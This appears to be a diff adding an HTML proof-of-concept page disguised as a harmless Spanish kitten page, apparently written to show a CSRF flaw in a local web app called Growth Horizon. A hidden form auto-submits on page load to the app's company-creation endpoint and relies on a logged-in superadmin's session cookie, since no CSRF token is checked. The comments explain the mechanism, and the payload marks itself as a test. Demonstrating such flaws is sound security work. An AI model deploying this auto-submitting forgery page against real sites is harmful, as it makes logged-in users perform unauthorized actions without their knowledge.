@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Pagina inofensiva de gatitos</title>
+</head>
+<body>
+    <h1>Mira que lindo gatito 🐱</h1>
+    <p>Esta pagina no tiene nada que ver con Growth Horizon... o eso parece.</p>
+
+    <!-- Este formulario se auto-envia solo, sin que hagas clic en nada,
+         directo al endpoint que crea una empresa nueva. Si en OTRA pestana
+         de este mismo navegador ya tienes sesion iniciada como superadmin,
+         la cookie de sesion se manda igual (por eso funciona), y como no
+         se pide ningun token CSRF, la empresa se crea sin que tu lo hayas
+         pedido en esta pagina. -->
+    <form id="ataque" action="http://127.0.0.1:5000/empresas/nueva" method="POST" style="display:none">
+        <input type="text" name="nombre" value="Empresa Creada Por CSRF (PRUEBA - puedes borrarla)">
+        <input type="text" name="sector_id" value="1">
+        <input type="text" name="tamano_id" value="1">
+    </form>
+
+    <script>
+        document.getElementById("ataque").submit();
+    </script>
+</body>
+</html>
